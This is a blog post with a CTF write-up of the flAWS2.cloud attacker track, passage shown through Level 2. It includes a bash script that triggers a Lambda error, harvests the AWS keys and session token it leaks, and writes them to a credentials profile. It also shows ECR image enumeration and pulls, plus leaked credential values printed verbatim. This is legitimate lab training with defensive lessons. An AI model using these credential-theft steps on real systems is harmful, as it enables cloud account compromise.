<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="pv-proxy-endpoint" content="https://myochosite-291718.appspot.com/query?id=ahNwfm15b2Nob3NpdGUtMjkxNzE4chULEghBcGlRdWVyeRiAgIDo14eBCgw"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Lab - CTF：Flaw2.cloud [attacker and defender]" /><meta property="og:locale" content="en" /><meta name="description" content="[toc]" /><meta property="og:description" content="[toc]" /><link rel="canonical" href="https://ocholuo.github.io//posts/flaw2/" /><meta property="og:url" content="https://ocholuo.github.io//posts/flaw2/" /><meta property="og:site_name" content="Grace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-24T10:11:11-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Lab - CTF：Flaw2.cloud [attacker and defender]" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-30T21:02:21-04:00","datePublished":"2021-01-24T10:11:11-05:00","description":"[toc]","headline":"Lab - CTF：Flaw2.cloud [attacker and defender]","mainEntityOfPage":{"@type":"WebPage","@id":"https://ocholuo.github.io//posts/flaw2/"},"url":"https://ocholuo.github.io//posts/flaw2/"}</script><title>Lab - CTF：Flaw2.cloud [attacker and defender] | Grace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Grace"><meta name="application-name" content="Grace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://myochosite-291718.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://myochosite-291718.appspot.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/huoye.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Grace</a></div><div class="site-subtitle font-italic">2023 Mar 14 updated</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ocholuo" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Lab - CTF：Flaw2.cloud [attacker and defender]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Lab - CTF：Flaw2.cloud [attacker and defender]</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Grace JyL </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 24, 2021, 10:11 AM -0500" >Jan 24, 2021<i class="unloaded">2021-01-24T10:11:11-05:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Oct 30, 2022, 6:02 PM -0700" >Oct 30, 2022<i class="unloaded">2022-10-30T21:02:21-04:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="5454 words">30 min read</span> <span id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </span> views</div></div><div class="post-content"><p>[toc]</p><hr /><h1 id="ctfflaw2">CTF：Flaw2</h1><hr /><p><img data-proofer-ignore data-src="https://i.imgur.com/xUVvhHa.png" alt="Screen Shot 2021-01-24 at 23.39.21" /></p><hr /><h1 id="attacker-track">Attacker Track</h1><hr /><h2 id="level-1---sourse-code-api-input-error">Level 1 - sourse code api input error</h2><blockquote><p>http://level1.flaws2.cloud/</p></blockquote><font color="red"> For this level, you'll need to enter the correct PIN code. The correct PIN is 100 digits long, so brute forcing it won't help. </font><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>aws s3 <span class="nb">ls </span>s3://level1.flaws2.cloud/
<span class="c"># An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied</span>

aws s3 <span class="nb">ls </span>s3://level1.flaws2.cloud/
    <span class="nt">--profile</span> default
<span class="c"># An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied</span>
</pre></table></code></div></div><ol><li>give the wrong code</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c"># code: 1234</span>
http://level1.flaws2.cloud/index.htm?incorrect
<span class="c"># The input validation is only done by the javascript. Get around it and pass a pin code that isn't a number.</span>
</pre></table></code></div></div><ol><li>source code</ol><div class="language-html highlighter-rouge"><div class="code-header" text-data="html"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
</pre><td class="rouge-code"><pre><span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"content"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-12"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;center&gt;&lt;h1&gt;</span>Level 1<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>

                <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
                    <span class="c1">// There is a client-side check on the parameter, which needs to be a number.</span>
                    <span class="c1">// This suggests that the backend application only accepts numbers.</span>
                    <span class="kd">function</span> <span class="nf">validateForm</span><span class="p">()</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="dl">"</span><span class="s2">myForm</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">code</span><span class="dl">"</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
                        <span class="nf">if </span><span class="p">(</span><span class="o">!</span> <span class="p">(</span> <span class="o">!</span><span class="nf">isNaN</span><span class="p">(</span><span class="nf">parseFloat</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nf">isFinite</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
                            <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Code must be a number</span><span class="dl">"</span><span class="p">);</span>
                            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="nt">&lt;/script&gt;</span>

                <span class="c">&lt;!-- Form data is validated as follows: --&gt;</span>
                <span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"myForm"</span> <span class="na">action=</span><span class="s">"https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1"</span> <span class="na">onsubmit=</span><span class="s">"return validateForm()"</span><span class="nt">&gt;</span>
                    Code:
                    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"code"</span> <span class="na">value=</span><span class="s">"1234"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;/form&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>

    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nf">if </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nf">includes</span><span class="p">(</span><span class="dl">"</span><span class="s2">incorrect</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">incorrect</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;b style='background-color:#ffbabf; border-radius:3px; border: 2px solid #adadad; padding:5px;'&gt;Incorrect. Try again.&lt;/b&gt;</span><span class="dl">"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

<span class="c">&lt;!-- the form submitting a request to https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=1234 --&gt;</span>

<span class="c">&lt;!-- change the parameter https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=a --&gt;</span>
<span class="c">&lt;!-- https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?a=a --&gt;</span>

Error, malformed input
{
    "PATH":"/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin",
    "LD_LIBRARY_PATH":"/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib",
    "LANG":"en_US.UTF-8","TZ":":UTC",
    "_HANDLER":"index.handler",
    "LAMBDA_TASK_ROOT":"/var/task",
    "LAMBDA_RUNTIME_DIR":"/var/runtime",
    "AWS_REGION":"us-east-1",
    "AWS_DEFAULT_REGION":"us-east-1",
    "AWS_LAMBDA_LOG_GROUP_NAME":"/aws/lambda/level1",
    "AWS_LAMBDA_LOG_STREAM_NAME":"2021/01/25/[$LATEST]8a9f5ac2839044cb8a620bcb9cb70ed1",
    "AWS_LAMBDA_FUNCTION_NAME":"level1",
    "AWS_LAMBDA_FUNCTION_MEMORY_SIZE":"128",
    "AWS_LAMBDA_FUNCTION_VERSION":"$LATEST",
    "_AWS_XRAY_DAEMON_ADDRESS":"169.254.79.2",
    "_AWS_XRAY_DAEMON_PORT":"2000",
    "AWS_XRAY_DAEMON_ADDRESS":"169.254.79.2:2000",
    "AWS_XRAY_CONTEXT_MISSING":"LOG_ERROR",
    "_X_AMZN_TRACE_ID":"Root=1-600e5095-29b6c96c385001134d332a25;Parent=4e64534f4cbdf814;Sampled=0",
    "AWS_EXECUTION_ENV":"AWS_Lambda_nodejs8.10",
    "AWS_LAMBDA_INITIALIZATION_TYPE":"on-demand",
    "NODE_PATH":"/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules",
    "AWS_ACCESS_KEY_ID":"ASIAZQNB3KHGKLHAFAAT",
    "AWS_SECRET_ACCESS_KEY":"+LceTa5RtXh+OlVEnXMLyaq2QXwve67hjp6ksviU",
    "AWS_SESSION_TOKEN":"IQoJb3JpZ2luX2VjEEsaCXVzLWVhc3QtMSJHMEUCIQCcaAlYq0OSI2qGz+PICgco09jMSVNgGKLU8SxVUEHPHAIgOv0OZTFJWs4fAuxulHpgDeYrxBPcN0Wapi4WaXnADhgqxQEIMxACGgw2NTM3MTEzMzE3ODgiDGiNRGqIak8fzySIayqiAR0IAnD/tBb54jELO69AhP4CQu3eJXF9pD+q22CT+14pjX3XS6oiqJoR2DS5XDOz1pxjtFt0hBkpqALPZOyh0Us1/cvAnPxL7THpdK7VPa8sMxomx+uONY7d7RV9IT33YC3JXtI1hO83x+NIxod13MYnE1Zqle0bidcB85aWvvlc/HftkP/hj4MfxqMcnoWMDYZTmc+6sVFuIongz4R1goIGYDD6tsGABjrgAVHkPQTsWYuVouK5nsGM4qcvcr3ITzhEnDukL6EAwrT9nWKkBkVE8B8/92ZOdxouAj3XxYLugJIgk96T2pT816MsGYvWbrYe3O9UOJFZ3OGJoCKtsSmNJE/S95JLCVJ+leaUvRuZnSm7NyrpX9viOju2KoiZVpDUx9MsmW39lrMA4ee5GfptC7UKVlxoyxVp0e/LFz4gGxMz3kVx9COPdt0cDD+UiB8enmOsoLiRv5XcLdE0A2NkZFm0MhrTcgc5PR/smtp/78ueppUPIevuvilZUUCnAEhrpqaelzzxa2je"}
</pre></table></code></div></div><ol><li>configure the aws credential</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://level1.flaws2.cloud/ <span class="nt">--profile</span> flaws2
<span class="c">#                            PRE img/</span>
<span class="c"># 2018-11-20 15:55:05      17102 favicon.ico</span>
<span class="c"># 2018-11-20 21:00:22       1905 hint1.htm</span>
<span class="c"># 2018-11-20 21:00:22       2226 hint2.htm</span>
<span class="c"># 2018-11-20 21:00:22       2536 hint3.htm</span>
<span class="c"># 2018-11-20 21:00:23       2460 hint4.htm</span>
<span class="c"># 2018-11-20 21:00:17       3000 index.htm</span>
<span class="c"># 2018-11-20 21:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html</span>


http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
<span class="c"># The next level is at http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud</span>
</pre></table></code></div></div><h2 id="script">Script</h2><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="nv">INFILE</span><span class="o">=</span>~/.aws/credentials
<span class="nv">PROFILE</span><span class="o">=</span><span class="s1">'flaws2'</span>

<span class="nv">res</span><span class="o">=</span><span class="sb">`</span>curl <span class="nt">-s</span> <span class="s1">'https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=x'</span> | <span class="nb">tail</span> <span class="nt">-n1</span><span class="sb">`</span>
<span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$res</span> | jq <span class="nt">-r</span> .AWS_ACCESS_KEY_ID<span class="sb">`</span>
<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$res</span> | jq <span class="nt">-r</span> .AWS_SECRET_ACCESS_KEY<span class="sb">`</span>
<span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$res</span> | jq <span class="nt">-r</span> .AWS_SESSION_TOKEN<span class="sb">`</span>
<span class="nv">AWS_REGION</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$res</span> | jq <span class="nt">-r</span> .AWS_REGION<span class="sb">`</span>

<span class="nb">echo</span> <span class="s2">"[</span><span class="nv">$PROFILE</span><span class="s2">]
REGION = </span><span class="nv">$AWS_REGION</span><span class="s2">
AWS_ACCESS_KEY_ID = </span><span class="nv">$AWS_ACCESS_KEY_ID</span><span class="s2">
AWS_SECRET_ACCESS_KEY = </span><span class="nv">$AWS_SECRET_ACCESS_KEY</span><span class="s2">
AWS_SESSION_TOKEN = </span><span class="nv">$AWS_SESSION_TOKEN</span><span class="s2">
"</span> | crudini <span class="nt">--merge</span> <span class="nv">$INFILE</span>
<span class="nb">echo</span> <span class="s2">"Set creds for profile </span><span class="nv">$PROFILE</span><span class="s2"> in </span><span class="nv">$INFILE</span><span class="s2">"</span>


aws s3 <span class="nb">ls </span>s3://level1.flaws2.cloud/ <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$PROFILE</span>
<span class="nb">echo</span> <span class="s2">"list the S3"</span>
</pre></table></code></div></div><h2 id="lesson-learned">Lesson learned</h2><p>Whereas EC2 instances obtain the credentials for their IAM roles from the metadata service at 169.254.169.254, AWS Lambda obtains those credentials from environmental variables.</p><ol><li>Often developers will dump environmental variables when error conditions occur in order to help them debug problems.<ul><li>dangerous as sensitive information can sometimes be found in environmental variables.</ul><li>the IAM role had privilieges to list the contents of a bucket which wasn’t needed for its operation.<ul><li>Best practice: Least Privilege strategy</ul><li>shouldn’t rely on input validation to happen only on the client side or at some point upstream from your code.<ul><li>AWS applications, especially serverless, are composed of many building blocks all chained together.<li>Developers sometimes assume that something upstream has already performed input validation. In this case, the client data was validated by Javascript which could be bypasseed, which then passed into API Gateway and finally to the Lambda.<li>Applications are often more complex than that, and these architectures can change over time, possibly breaking assumptions about where validation is supposed to occur.</ul></ol><hr /><h2 id="level-2---public-container-image--build-history">Level 2 - public container image &amp; build history</h2><blockquote><p>http://level1.flaws2.cloud/</p></blockquote><font color="red"> This next level is running as a container at http://container.target.flaws2.cloud/. - Just like S3 buckets, other resources on AWS can have open permissions. - I'll give you a hint that the ECR (Elastic Container Registry) is named "level2". </font><ol><li>If an ECR is public, list the images<ul><li><code class="language-plaintext highlighter-rouge">aws ecr list-images --repository-name REPO_NAME --registry-id ACCOUNT_ID</code></ul><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre> <span class="c"># get account id</span>
 aws sts get-caller-identity <span class="se">\</span>
     <span class="nt">--profile</span> flaws2
 <span class="c"># {</span>
 <span class="c">#     "UserId": "AROAIBATWWYQXZTTALNCE:level1",</span>
 <span class="c">#     "Account": "653711331788",</span>
 <span class="c">#     "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"</span>
 <span class="c"># }</span>

 <span class="c"># get the correct region:</span>
 dig level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
 <span class="c"># ;; ANSWER SECTION:</span>
 <span class="c"># level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud. 5	IN A 52.217.37.195</span>

 nslookup 52.217.37.195
 <span class="c"># Server:		192.168.1.1</span>
 <span class="c"># Address:    	192.168.1.1#53</span>
 <span class="c"># Non-authoritative answer:</span>
 <span class="c"># 195.37.217.52.in-addr.arpa	name = s3-website-us-east-1.amazonaws.com.</span>

 <span class="c"># list the images with:</span>
 aws ecr list-images <span class="se">\</span>
     <span class="nt">--repository-name</span> level2 <span class="se">\</span>
     <span class="nt">--registry-id</span> 653711331788 <span class="se">\</span>
     <span class="nt">--region</span> us-east-1
 <span class="c"># {</span>
 <span class="c">#     "imageIds": [</span>
 <span class="c">#         { "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",</span>
 <span class="c">#           "imageTag": "latest" }</span>
 <span class="c">#     ]</span>
 <span class="c"># }</span>

</pre></table></code></div></div><li>the image is public<ul><li>two choices<li>download it locally with docker, pull and investigate it with Docker commands<li>or manually with the AWS CLI.</ul></ol><blockquote><p>Option 1: Using the docker commands</p></blockquote><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
</pre><td class="rouge-code"><pre><span class="c"># download it locally</span>
<span class="c"># Retrieves a token that is valid for a specified registry for 12 hours</span>
<span class="c"># and then it prints a docker login command with that authorisation token.</span>
aws ecr get-login-password <span class="se">\</span>
    <span class="nt">--profile</span> flaws2 <span class="se">\</span>
    <span class="nt">--region</span> us-east-1 <span class="se">\</span>
    | docker login  <span class="se">\</span>
    <span class="nt">--username</span> AWS <span class="se">\</span>
    <span class="nt">--password-stdin</span> <span class="se">\</span>
    653711331788.dkr.ecr.us-east-1.amazonaws.com
<span class="c"># Login Succeeded</span>

<span class="c"># pull/download the image from the repository:</span>
docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
<span class="c"># latest: Pulling from level2</span>
<span class="c"># 7b8b6451c85f: Pull complete</span>
<span class="c"># ...</span>
<span class="c"># Digest: sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e</span>
<span class="c"># Status: Downloaded newer image for 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest</span>
<span class="c"># 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest</span>


<span class="c"># verify it’s been pulled correctly:</span>
docker image <span class="nb">ls</span>
<span class="c"># REPOSITORY                                            TAG                 IMAGE ID            CREATED             SIZE</span>
<span class="c"># 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2   latest              2d73de35b781        11 months ago       202M</span>


<span class="c"># shows the final command executed and a number of read-only layers:</span>
docker inspect 2d73de35b781
<span class="c"># [</span>
<span class="c">#     {</span>
<span class="c">#         "Id": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621",</span>
<span class="c">#         "RepoTags": [ "653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest" ,</span>
<span class="c">#         "RepoDigests": [ "653711331788.dkr.ecr.us-east-1.amazonaws.com/level2@sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e" ],</span>
<span class="c">#         "Parent": "",</span>
<span class="c">#         "Comment": "",</span>
<span class="c">#         "Created": "2018-11-27T03:32:59.959842964Z",</span>
<span class="c">#         "Container": "ac1212c533fd9920b36cf3518caeb27b07e5efca6d40a0cfb07acc94c3f02055",</span>
<span class="c">#         "ContainerConfig": {</span>
<span class="c">#             "Hostname": "ac1212c533fd",</span>
<span class="c">#             "Domainname": "",</span>
<span class="c">#             "User": "",</span>
<span class="c">#             "AttachStdin": false,</span>
<span class="c">#             "AttachStdout": false,</span>
<span class="c">#             "AttachStderr": false,</span>
<span class="c">#             "ExposedPorts": { "80/tcp": {} },</span>
<span class="c">#             "Tty": false,</span>
<span class="c">#             "OpenStdin": false,</span>
<span class="c">#             "StdinOnce": false,</span>
<span class="c">#             "Env": [ "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" ],</span>
<span class="c">#             "Cmd": [</span>
<span class="c">#                 "/bin/sh",</span>
<span class="c">#                 "-c",</span>
<span class="c">#                 "#(nop) ",</span>
<span class="c">#                 "CMD ["sh" "/var/www/html/start.sh"]"</span>
<span class="c">#             ],</span>
<span class="c">#             "ArgsEscaped": true,</span>
<span class="c">#             "Image": "sha256:6bb13d45a562a2f15ca30b6a895698b27231a190049f1d4489aeba4fa86a75fe",</span>
<span class="c">#             "Volumes": null,</span>
<span class="c">#             "WorkingDir": "",</span>
<span class="c">#             "Entrypoint": null,</span>
<span class="c">#             "OnBuild": null,</span>
<span class="c">#             "Labels": {}</span>
<span class="c">#         },</span>
<span class="c">#         "DockerVersion": "18.09.0",</span>
<span class="c">#         "Author": "",</span>
<span class="c">#         "Config": {</span>
<span class="c">#             "Hostname": "",</span>
<span class="c">#             "Domainname": "",</span>
<span class="c">#             "User": "",</span>
<span class="c">#             "AttachStdin": false,</span>
<span class="c">#             "AttachStdout": false,</span>
<span class="c">#             "AttachStderr": false,</span>
<span class="c">#             "ExposedPorts": { "80/tcp": {} },</span>
<span class="c">#             "Tty": false,</span>
<span class="c">#             "OpenStdin": false,</span>
<span class="c">#             "StdinOnce": false,</span>
<span class="c">#             "Env": [ "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" ],</span>
<span class="c">#             "Cmd": [ "sh", "/var/www/html/start.sh" ],</span>
<span class="c">#             "ArgsEscaped": true,</span>
<span class="c">#             "Image": "sha256:6bb13d45a562a2f15ca30b6a895698b27231a190049f1d4489aeba4fa86a75fe",</span>
<span class="c">#             "Volumes": null,</span>
<span class="c">#             "WorkingDir": "",</span>
<span class="c">#             "Entrypoint": null,</span>
<span class="c">#             "OnBuild": null,</span>
<span class="c">#             "Labels": null</span>
<span class="c">#         },</span>
<span class="c">#         "Architecture": "amd64",</span>
<span class="c">#         "Os": "linux",</span>
<span class="c">#         "Size": 201856589,</span>
<span class="c">#         "VirtualSize": 201856589,</span>
<span class="c">#         "GraphDriver": {</span>
<span class="c">#             "Data": {</span>
